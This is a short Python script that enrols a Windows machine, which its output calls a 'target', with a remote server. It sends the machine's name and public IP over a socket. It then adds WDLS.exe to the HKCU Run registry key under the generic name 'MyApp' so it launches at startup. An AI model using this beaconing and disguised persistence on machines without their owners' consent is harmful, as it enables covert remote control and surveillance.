import json
import socket
from requests import get
import winreg
import os

with open('settings.json', 'r') as f:
    data = json.load(f)

ip = str(input("Enter server IP: "))
port = int(input("Enter server port: "))
name = str(input("Enter the name of the Computer/User: "))

myip = get('https://api.ipify.org').text

print("Registering computer with the server.")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((ip,port))
except:
    print("Server is offline. Try again later.")
    while True:
        pass

s.send(bytes(f'SETUP|{name}|{myip}','utf-8'))

confirmation = s.recv(50).decode('utf-8')
confSplit = confirmation.split('|')

if confSplit[0] == 'Y':
    print(f"Successfully registered target with server.\nAssigned ID: {confSplit[1]}")

else:
    print("There was an error registering the client with server.")

with open('settings.json', 'w') as f:
    dataObj = {"IP":ip,"PORT":port,"NAME":name,"ID":confSplit[1]}
    data.append(dataObj)
    json.dump(data, f, indent=4)


def add_to_startup(file_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

exe_file_path = r"WDLS.exe" #Change file name if required

if os.path.exists(exe_file_path):
    add_to_startup(exe_file_path)
    print("Enabled auto-start at startup.")
else:
    print("Error: Couldnt enable auto-start at startup")


print("\n\n--------------------------------------------------\nSetup completed!\nYou can now close this tab.")
while True:
    pass